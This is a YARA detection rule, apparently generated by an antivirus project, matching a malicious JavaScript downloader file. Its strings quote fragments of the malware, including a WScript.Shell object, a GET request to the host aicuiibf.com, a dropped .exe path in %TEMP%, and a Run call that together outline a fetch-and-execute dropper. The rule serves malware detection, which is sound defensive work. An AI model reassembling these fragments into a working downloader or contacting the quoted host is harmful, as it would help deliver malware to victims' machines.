rule sig_20160328_2e23355e06a09f297fca5b5e5d74c7e6 {
  meta:
    description = "datamaliciousorder - file 20160328_2e23355e06a09f297fca5b5e5d74c7e6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9bac70a33c2378b0e304e8eda930c4c2efc2844c8bb115b46b771c258daabd57"

  strings:
    $s1  = "function Vzwigfkabc() {return Xqlkgcms[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"JAJPhZuAa.exe\";};" fullword ascii
    $s2  = "Zrntcmcwsh[Zmgja](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Mmqvvvpbdy](Uaqousleal() * 11)} while (Zrntcmcwsh[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Xqlkgcms = function Ufmbcmnwoy() {return WScript[Wtyzibqo](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Gkzocukac(Gkdcql, Ymutxhkah){return Gkdcql - Ymutxhkah;};" fullword ascii
    $s6  = "function Roojsp(Omaxylpev){Xqlkgcms[\"Run\"](Omaxylpev, Lobucdonxx, Lobucdonxx);};" fullword ascii
    $s7  = "function Anixqydg() {return ((Ttylmqrwdz == true) && (Ttylmqrwdz == Fxfkc)) ? 1 : Lobucdonxx;};" fullword ascii
    $s8  = "function Uaqousleal(){return 22;};" fullword ascii
    $s9  = "var Ttylmqrwdz = false;" fullword ascii
    $s10 = "function Yzwvgle(Kwglqdrocm) {var Wdzlwxoxau = (1, 2, 3, 4, 5, Kwglqdrocm); return Wdzlwxoxau;};" fullword ascii
    $s11 = " while (Bgpqun){" fullword ascii
    $s12 = "function Rrpcmnj(){return Wtyzibqo;};" fullword ascii
    $s13 = "function Xxmkmldk()" fullword ascii
    $s14 = "var Fxfkc = false;" fullword ascii
    $s15 = "function Locxy(){return Mjgotovyu;};" fullword ascii
    $s16 = "return Gkzocukac(Kbpkekytl, Xpfzdabxx);" fullword ascii
    $s17 = "Fxfkc = true; " fullword ascii
    $s18 = "Ttylmqrwdz = true; " fullword ascii
    $s19 = "var Tmksjbulxj = false;" fullword ascii
    $s20 = "} catch(Wkanbdrx){Bgpqun = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}